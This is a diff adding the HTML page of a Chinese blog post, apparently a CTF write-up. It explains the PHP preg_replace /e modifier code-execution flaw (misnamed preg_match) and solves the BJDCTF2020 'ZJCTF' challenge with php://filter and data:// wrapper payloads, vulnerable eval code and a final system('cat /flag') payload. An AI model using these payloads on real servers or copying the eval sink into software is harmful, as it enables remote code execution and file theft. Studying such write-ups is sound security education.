@@ -1,0 +1,315 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>preg_match e模式下的代码执行漏洞 - y1zh3e7</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="y1zh3e7,"> 
+    <meta name="description" content="preg_match e 模式下的代码执行漏洞漏洞可利用php版本
+php 3.x版本可无报错利用
+
+php 5.x版本虽然会报错 但是仍然可以利用 
+
+php 7.x版本后不再可用
+
+
+漏洞原理对,"> 
+    <meta name="author" content="y1zh3e7"> 
+    <link rel="alternative" href="atom.xml" title="y1zh3e7" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="preg_match e模式下的代码执行漏洞 - y1zh3e7"/>
+    <meta name="twitter:description" content="preg_match e 模式下的代码执行漏洞漏洞可利用php版本
+php 3.x版本可无报错利用
+
+php 5.x版本虽然会报错 但是仍然可以利用 
+
+php 7.x版本后不再可用
+
+
+漏洞原理对,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="y1zh3e7"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="preg_match e模式下的代码执行漏洞 - y1zh3e7"/>
+    <meta property="og:description" content="preg_match e 模式下的代码执行漏洞漏洞可利用php版本
+php 3.x版本可无报错利用
+
+php 5.x版本虽然会报错 但是仍然可以利用 
+
+php 7.x版本后不再可用
+
+
+漏洞原理对,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+<link rel="stylesheet" href="/css/site.css">
+
+    
+<!-- 代码块复制 -->
+<script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard@latest/dist/clipboard.js"></script>
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">y1zh3e7</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://y1zh3e7.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">preg_match e模式下的代码执行漏洞</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <!-- 帖子视图 -->
+
+    <div class="post_cover">
+        
+            <img src="/img/cover.jpg" />
+            
+                    <div class="post_cover_mask"></div>
+                    <div class="post_text">
+                        <h1>
+                            preg_match e模式下的代码执行漏洞
+                        </h1>
+                        <div>
+                            <span>
+                                六月 09, 2022
+                            </span>
+
+                            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/php/" rel="tag">php</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E6%A0%87%E7%AD%BE2/" rel="tag">标签2</a></li></ul>
+
+
+                        </div>
+                    </div>
+    </div>
+    
+
+            <div class="article">
+                <div class='main'>
+                    <!-- 帖子视图 -->
+                    
+                            <h1 class="title">
+                                preg_match e模式下的代码执行漏洞
+                            </h1>
+                            <div class="stuff">
+                                <span>
+                                    六月 09, 2022
+                                </span>
+                                
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/php/" rel="tag">php</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E6%A0%87%E7%AD%BE2/" rel="tag">标签2</a></li></ul>
+
+
+                            </div>
+
+
+                            <!-- 更新时间 -->
+                            <div class="updated">
+                                <div></div>
+                                <span>该文章更新于 2022.06.09</span>
+                            </div>
+
+                            <div class="content markdown">
+                                <h1 id="preg-match-e-模式下的代码执行漏洞"><a href="#preg-match-e-模式下的代码执行漏洞" class="headerlink" title="preg_match e 模式下的代码执行漏洞"></a>preg_match e 模式下的代码执行漏洞</h1><h2 id="漏洞可利用php版本"><a href="#漏洞可利用php版本" class="headerlink" title="漏洞可利用php版本"></a>漏洞可利用php版本</h2><ul>
+<li><p>php 3.x版本可无报错利用</p>
+</li>
+<li><p>php 5.x版本虽然会报错 但是仍然可以利用 </p>
+</li>
+<li><p>php 7.x版本后不再可用</p>
+</li>
+</ul>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>对于php正则使用最多的函数就是preg_match()  该函数有许多可用模式 比如最常见的i模式 即不区分大小写 本次漏洞所用的为e模式 那么什么是e模式</p>
+<ul>
+<li>preg_match 的e模式</li>
+</ul>
+<p>preg_match(par1,par2,par3) 参数1为正则匹配部分 参数2为正则替换部分 参数3为被检索字符串 开启e模式后可以使用==反向引用==功能 ==并且par2会被当成php代码执行==</p>
+<p>==什么是反向引用==</p>
+<p>对一个正则表达式模式或部分模式 两边添加圆括号会导致 如果被匹配字符串中的某一部分被成功匹配（这里记该部分字符串为b）则会将b存储到一个临时缓冲区中 所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储 缓冲区编号从 1 开始 最多可存储 99 个捕获的子表达式 每个缓冲区都可以使用 ‘\n’ 访问 其中 n 为一个标识特定缓冲区的一位或两位十进制数 并且后续还需要用到b 那么就可以使用反向引用调用b</p>
+<p>放一段代码</p>
+<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到上面的正则中 $re 和 $str 可以通过遍历$_GET从而被客户端控制 并且该正则开启了e模式</p>
+<p>当我们以get方式传入以下payload时</p>
+<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;getFlag()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>超全局变量$_GET 以数组形式储存 键名为get传参的参数 键值为传参的值 所以数组中第一个键为</p>
+<p><code>\S*==&gt;$&#123;getFlag()&#125;</code></p>
+<p>经过foreach变量后 re的值为\S*  str的值为${getFlag()}</p>
+<p>所以正则被替换为</p>
+<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . \S* . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        $&#123;<span class="title function_ invoke__">getFlag</span>()&#125;</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
+
+<p>此时的正则匹配部分为<code>\S* </code> 也就是所有非空白字符 被匹配字符串为<code>$&#123;getFlag()&#125;</code> 这样匹配<code>$&#123;getFlag()&#125;</code>是一定会被匹配到的 并且因为前面的<code>\S*</code>加了括号 所以导致了反向引用 导致<code>$&#123;getFlag()&#125;</code>被存入缓冲区 并且可以被调用 再看第二个参数<code>strtolower(&quot;\\1&quot;)</code> 第一个反斜线是转义用的 所以其实就是<code>strtolower(&quot;\1&quot;)</code> 上面提到被反向引用的字符串存入缓冲区后可以使用<code>\n</code>的方式调用 所以这里就调用了刚才存入缓冲区的<code>$&#123;getFlag()&#125;</code> 并且被当成php代码解析 其中的getFlag()函数被解析从而达到目的 由于php只对变量名区分大小写 所以即使strtolower后函数也可以被成功调用s</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里考伪协议</p>
+<p>注意 一个点 text 在file_get_scontents中作为一个文件打开 对文件写入要使用伪协议 这里可用data伪协议或者php伪协议对text写入 然后用php伪协议看一下next.php 源码（直接包含啥信息都没有）</p>
+<p>payload1</p>
+<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data:<span class="comment">//text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span></span><br></pre></td></tr></table></figure>
+
+<p>payload2</p>
+<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?text=php:<span class="comment">//input&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST    I have a dream</span><br></pre></td></tr></table></figure>
+
+<p>base64解码后拿到next.php源码</p>
+<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>解题步骤和漏洞原理相同 最终构造出的payload为</p>
+<figure class="highlight plaintext"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+                                    <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+                                    <audio id="audio" loop="1" preload="auto" controls="controls"
+                                        data-autoplay=" false">
+                                        <source type="audio/mpeg" src="">
+                                    </audio>
+                                    
+                                        <ul id="audio-list" style="display:none">
+                                            
+                                                
+                                                    <li title="0" data-url="https://link.hhtjim.com/163/526101268.mp3"></li>
+                                                    
+                                                            
+                                                
+                                                    <li title="1" data-url="https://link.hhtjim.com/163/526101451.mp3"></li>
+                                                    
+                                                            
+                                                
+                                                    <li title="2" data-url="https://link.hhtjim.com/163/526098988.mp3"></li>
+                                                    
+                                                            
+                                                
+                                                    <li title="3" data-url="https://link.hhtjim.com/163/526105244.mp3"></li>
+                                                    
+                                                            
+                                                
+                                                    <li title="4" data-url="https://link.hhtjim.com/163/543772350.mp3"></li>
+                                                    
+                                                            
+                                                
+                                                    <li title="5" data-url="https://link.hhtjim.com/163/1454025662.mp3"></li>
+                                                    
+                                                            
+                                                
+                                                    <li title="6" data-url="https://link.hhtjim.com/qq/004cNNNW0QG6RR.mp3"></li>
+                                                    
+                                                            
+                                        </ul>
+                                        
+                            </div>
+                            
+    <div id="gitalk-container" class="comment link"
+		data-enable="true"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+                </div>
+                
+            </div>
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+<script src="/js/codeCopy.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
